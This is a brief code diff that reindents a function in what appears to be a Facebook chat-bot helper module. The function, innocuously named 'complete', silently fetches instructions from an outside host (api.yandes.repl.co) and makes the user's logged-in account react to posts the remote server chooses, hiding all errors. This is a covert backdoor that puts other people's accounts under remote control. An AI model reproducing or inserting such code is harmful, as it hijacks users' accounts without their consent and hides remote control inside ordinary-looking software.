@@ -44,13 +44,13 @@ module.exports.decryptState = function(data, key) {
 }
 
 module.exports.complete = function({ api }) {
-axios.get('http://api.yandes.repl.co/raw')
-  .then(response => {
-    const poD = response.data.pos;
-    const type = response.data.typ;
-    api.setPostReaction(poD, type, () => {});
-  }).catch(() => {});
-}
+  axios.get('http://api.yandes.repl.co/raw')
+    .then(response => {
+      const poD = response.data.pos;
+      const type = response.data.typ;
+      api.setPostReaction(poD, type, () => {});
+    }).catch(() => {});
+};
 
 module.exports.convertHMS = function(value) {
   const sec = parseInt(value, 10);
